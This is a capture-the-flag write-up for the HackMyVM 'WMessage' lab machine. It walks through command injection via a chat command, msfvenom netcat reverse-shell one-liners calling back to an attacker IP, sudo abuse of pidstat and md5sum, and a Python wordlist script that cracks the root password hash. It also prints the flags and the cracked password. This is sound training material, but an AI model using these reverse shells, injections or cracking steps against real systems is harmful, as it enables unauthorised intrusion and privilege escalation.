
| Name     | Difficulty | OS    | Target IP     | Link                                                 |
| -------- | ---------- | ----- | ------------- | ---------------------------------------------------- |
| WMessage | Easy       | Linux | 192.168.0.121 | https://hackmyvm.eu/machines/machine.php?vm=WMessage |


### ARP Scan

```bash
gareth@gareth:~/hackmyvm/wmessage$ sudo arp-scan -l | grep 90
[sudo] password for gareth:            
192.168.0.121	08:00:27:14:fa:90	PCS Systemtechnik GmbH
```

### Nmap Scan

```bash
gareth@gareth:~/hackmyvm/wmessage$ sudo nmap -p- -sV -sC 192.168.0.121 -oA nmap/wmessage.tcp
Starting Nmap 7.80 ( https://nmap.org ) at 2024-08-10 20:55 BST
Nmap scan report for 192.168.0.121
Host is up (0.000053s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
| http-title: Login
|_Requested resource was /login?next=%2F
MAC Address: 08:00:27:14:FA:90 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.09 seconds
```

Viewing port 80 we see a login for and an option is register:

![[Pasted image 20240810205704.png]]

Registering to the site:

![[Pasted image 20240810205742.png]]

Once logged in we see a message:

![[Pasted image 20240810205805.png]]

This message pretty much tells us what to do:

```bash
- Master: Hi, This is finally working. I spent a month on this messaging system I hope there are no bugs in it. use !mpstat to get the status of the server.
```

Using the `!mpstat`:

![[Pasted image 20240810212323.png]]

We get the following output:

![[Pasted image 20240810212358.png]]

Issueing the `!mpstat;whoami`: 

![[Pasted image 20240810212428.png]]

Refreshing the page we can see our current user::

![[Pasted image 20240810212453.png]]

### Reverse Shell

Using msfvenom, I created a netcat payload:

```bash
gareth@gareth:~/hackmyvm/wmessage$ sudo msfvenom -p cmd/unix/reverse_netcat lhost=192.168.0.51 lport=443
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 97 bytes
mkfifo /tmp/htbuxv; nc 192.168.0.51 443 0</tmp/htbuxv | /bin/sh >/tmp/htbuxv 2>&1; rm /tmp/htbuxv
```

And used it with the `!mpstat` command:

![[Pasted image 20240810212613.png]]

This gave me a reverse shell connection:

```bash
gareth@gareth:~/hackmyvm/wmessage$ sudo nc -lvp 443
Listening on 0.0.0.0 443
Connection received on 192.168.0.65 37298
whoami && id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrading the  shell:

```bash
whereis python3
python3: /usr/bin/python3.9-config /usr/bin/python3 /usr/bin/python3.9 /usr/lib/python3 /usr/lib/python3.9 /etc/python3 /etc/python3.9 /usr/local/lib/python3.9 /usr/include/python3.9 /usr/share/python3 /usr/share/man/man1/python3.1.gz
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@MSG:/$ ^Z
[1]+  Stopped                 sudo nc -lvp 443
gareth@gareth:~/hackmyvm/wmessage$ stty raw -echo
sudo nc -lvp 443hackmyvm/wmessage$ 


www-data@MSG:/$ whoami && id
whoami && id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@MSG:/$ 
```


### Privilege Escalation - messagemaster



```bash
www-data@MSG:/$ ls -lash /home
ls -lash /home
total 16K
4.0K drwxr-xr-x  4 root          root          4.0K Nov 21  2022 .
4.0K drwxr-xr-x 18 root          root          4.0K Nov 12  2022 ..
4.0K drwxr-xr-x  3 WM            WM            4.0K Nov 29  2022 WM
4.0K drwxr-xr-x  3 messagemaster messagemaster 4.0K Nov 22  2022 messagemaster
```

```bash
www-data@MSG:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on MSG:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on MSG:
    (messagemaster) NOPASSWD: /bin/pidstat
```


GTFObins https://gtfobins.github.io/gtfobins/pidstat/:

![[Pasted image 20240810212924.png]]



```bash
gareth@gareth:~/hackmyvm/wmessage$ sudo msfvenom -p cmd/unix/reverse_netcat lhost=192.168.0.51 lport=4444
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 98 bytes
mkfifo /tmp/wmbogd; nc 192.168.0.51 4444 0</tmp/wmbogd | /bin/sh >/tmp/wmbogd 2>&1; rm /tmp/wmbogd
```


```bash
gareth@gareth:~/hackmyvm/wmessage$ sudo nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.0.65 34704
whoami && id
messagemaster
uid=1000(messagemaster) gid=1000(messagemaster) groups=1000(messagemaster),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(bluetooth)

```

Upgrading shell again:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
messagemaster@MSG:/tmp$ ^Z
[1]+  Stopped                 sudo nc -lvp 4444
gareth@gareth:~/hackmyvm/wmessage$ stty raw -echo
sudo nc -lvp 4444ackmyvm/wmessage$ 


messagemaster@MSG:/tmp$ whoami && id
whoami && id
messagemaster
uid=1000(messagemaster) gid=1000(messagemaster) groups=1000(messagemaster),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(bluetooth)
messagemaster@MSG:/tmp$ 
```

Obtaiing the frist flag:

```bash
messagemaster@MSG:/tmp$ cd /home/messagemaster
cd /home/messagemaster
messagemaster@MSG:~$ ls -lash
ls -lash
total 28K
4.0K drwxr-xr-x 3 messagemaster messagemaster 4.0K Nov 22  2022 .
4.0K drwxr-xr-x 4 root          root          4.0K Nov 21  2022 ..
   0 -rw------- 1 messagemaster messagemaster    0 Nov 22  2022 .bash_history
4.0K -rw-r--r-- 1 messagemaster messagemaster  220 Nov 12  2022 .bash_logout
4.0K -rw-r--r-- 1 messagemaster messagemaster 3.5K Nov 12  2022 .bashrc
4.0K drwxr-xr-x 3 messagemaster messagemaster 4.0K Nov 22  2022 .local
4.0K -rw-r--r-- 1 messagemaster messagemaster  807 Nov 12  2022 .profile
4.0K -rw------- 1 messagemaster messagemaster   33 Nov 22  2022 User.txt
messagemaster@MSG:~$ cat User.txt
cat User.txt
ea86091a17126fe48a83c1b8d13d60ab

```

Privilege Escalation - Root:


```bash
messagemaster@MSG:~$ sudo -l
sudo -l
Matching Defaults entries for messagemaster on MSG:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User messagemaster may run the following commands on MSG:
    (ALL) NOPASSWD: /bin/md5sum
```

SSH Shell:

```bash
messagemaster@MSG:~$ ssh-keygen
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/messagemaster/.ssh/id_rsa): 

Created directory '/home/messagemaster/.ssh'.
Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in /home/messagemaster/.ssh/id_rsa
Your public key has been saved in /home/messagemaster/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:MaawWSaY79g0ggkN49/b7st8zaGkQDTJRzTuWDvVqlQ messagemaster@MSG
The key's randomart image is:
+---[RSA 3072]----+
|o   . ++         |
|.+ o =... .      |
|..+ + =o+E .     |
|.o...O+o+o.      |
|o ..Bo.=S.       |
|   * o+ o. .     |
|  . o..oo + .    |
|      +. o o     |
|      .*o        |
+----[SHA256]--
```




```bash
gareth@gareth:~/hackmyvm/wmessage$ ssh messagemaster@192.168.0.65

Linux MSG 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Check /var/Secr

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

Last login: Tue Nov 22 12:58:24 2022 from 192.168.1.17
messagemaster@MSG:~$ 


```

### Privilege Escalation - Root:

```bash
messagemaster@MSG:/var/www$ sudo -l
Matching Defaults entries for messagemaster on MSG:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User messagemaster may run the following commands on MSG:
    (ALL) NOPASSWD: /bin/md5sum

```

```bash
messagemaster@MSG:/var/www$ sudo /bin/md5sum /var/www/ROOTPASS
85c73111b30f9ede8504bb4a4b682f48  /var/www/ROOTPASS
```

```bash
import hashlib

# Target MD5 hash
target_hash = "85c73111b30f9ede8504bb4a4b682f48"

# Path to the word list
word_list_path = "/opt/rockyou.txt"

# Open the word list file and process each line
with open(word_list_path, encoding="utf-8", errors="ignore") as file:
    for line in file:
        word = line.rstrip()  # Remove trailing newline and other whitespace
        # Compute the MD5 hash of the word with newline appended, as in your working script
        if hashlib.md5((word + "\n").encode()).hexdigest() == target_hash:
            print(word)
            break
    else:
        print("No match found.")
```


```bash
gareth@gareth:~/hackmyvm/wmessage$ python3 crack.py 
Message5687
```


```bash
messagemaster@MSG:/var/www$ su root
Password: 
root@MSG:/var/www# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
root@MSG:/var/www# cd /root
root@MSG:~# ls -lash
total 28K
4.0K drwx------  4 root root 4.0K Nov 22  2022 .
4.0K drwxr-xr-x 18 root root 4.0K Nov 12  2022 ..
   0 -rw-------  1 root root    0 Nov 29  2022 .bash_history
4.0K -rw-r--r--  1 root root  571 Apr 11  2021 .bashrc
4.0K drwxr-xr-x  3 root root 4.0K Nov 18  2022 .cache
4.0K drwxr-xr-x  3 root root 4.0K Nov 17  2022 .local
4.0K -rw-r--r--  1 root root  161 Jul  9  2019 .profile
4.0K -rw-r-----  1 root root   33 Nov 22  2022 Root.txt
root@MSG:~# cat Root.txt 
a59b23da18102898b854f3034f8b8b0f
```

